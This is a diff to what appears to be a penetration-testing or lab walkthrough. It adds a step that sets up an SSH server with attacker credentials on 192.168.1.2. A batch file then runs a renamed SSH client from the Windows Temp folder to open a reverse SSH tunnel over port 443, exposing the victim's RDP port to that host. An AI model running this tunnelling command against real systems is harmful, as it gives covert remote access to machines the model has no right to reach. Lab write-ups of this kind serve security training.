@@ -134,7 +134,12 @@
    ![image](https://github.com/user-attachments/assets/272a554b-5da5-4103-8ec0-18ee4424299e)
 
 
-   f. let's write FXS.bat file to run `ekern.exe` and establish reverse SSH Connection to RDP
+   f. download Bitvise SSH Server `192.168.1.2` and configure credentials
+
+      username: H@ck3r
+      password: C@n't_D3f3nd_2021-44077
+
+   g. let's write FXS.bat file to run `ekern.exe` and establish reverse SSH Connection to RDP
 
       echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@n't_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.145:3389 192.168.1.2
       
